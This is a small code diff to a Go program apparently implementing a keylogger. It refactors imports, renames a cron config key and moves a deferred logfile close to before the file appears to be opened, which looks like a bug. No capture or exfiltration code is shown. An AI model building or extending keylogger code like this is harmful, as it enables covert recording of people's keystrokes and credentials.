@@ -1,8 +1,7 @@
 package main
 
-import (
-	"log"
-)
+import "log"
+
 
 var (
 	shift bool
@@ -10,6 +9,7 @@ var (
 )
 
 func RunKeyLogger() {
+	defer logfile.Close()
 	devs, err := NewDevices()
 	if err != nil {
 		log.Fatal(err)
@@ -19,10 +19,9 @@ func RunKeyLogger() {
 	if err != nil {
 		log.Fatal(err)
 	}
-	defer logfile.Close()
 	go func() {
 		for {
-			CronJob(conf.GetString("cron_time"))
+			CronJob(conf.GetString("cron_duration"))
 		}
 	}()
 	for ie := range ret {
